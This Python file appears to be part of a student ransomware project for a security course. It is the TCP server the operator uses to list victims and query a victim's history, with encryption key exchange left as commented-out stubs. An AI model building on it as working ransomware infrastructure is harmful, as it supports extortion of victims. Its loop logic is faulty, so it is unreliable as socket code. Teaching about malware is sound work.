#!/usr/bin/python
# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
import configgetter as config
import security
import os
import utile.data as udata


# --------------------------------------------
# Classes & Functions
# --------------------------------------------
class server_tcp(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.encryptkey = os.urandom(32)

    def start_server(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            self.s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        self.s.listen(10)
        self.conn, self.addr = self.s.accept()
        print(f'[+] New TCP Connexion from ' + str(self.addr[0]) + ":" + str(self.addr[1]))
        # Implémentation sécurité : AES
        # conn.send(bytes(str(key), 'utf-8'))
        # conn.send(bytes(str(nonce), 'utf-8'))
        # conn.send(bytes(str(tag), 'utf-8'))
        while True:
            self.s.setblocking(0)
            msg = self.conn.recv(2048)

            if msg is not None or msg != b'':
                print(str(self.addr[0]) + " >> " + str(msg))
                rs = str(self.gestion_msg(msg))
                # @Todo: Build header & send it before msg
                self.conn.send(bytes(rs, 'utf-8'))

    def gestion_msg(self, message):
        if message == b'1':
            return udata.list_victim()
        elif message == b'2':
            self.conn.send(bytes('Please provide an user ID for the history', 'utf-8'))
            id = self.conn.recv(2048).decode()
            return udata.history_req(id)
        elif message == b'3':
            return "Todo3"


srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
srv.start_server()
